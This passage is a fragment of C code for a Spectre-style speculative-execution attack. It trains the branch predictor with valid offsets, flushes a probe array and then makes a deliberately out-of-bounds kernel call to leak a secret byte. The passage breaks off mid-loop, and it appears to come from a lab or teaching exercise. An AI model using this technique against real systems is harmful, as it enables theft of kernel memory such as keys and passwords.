...
static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t secret_offset) {
    ...
    for (int trial = 0; trial < NUM_TRIALS; trial++) {
        /* Train branch predictor with valid offsets */
        for (int t = 0; t < TRAIN_ROUNDS; t++) {
            call_kernel_part2(kernel_fd, shared_memory, t % 4);
        }

        /* Flush probe array right before malicious call */
        flush_shared_memory(shared_memory);

        /* Malicious out-of-bounds call */
        call_kernel_part2(kernel_fd, shared_memory, secret_offset);
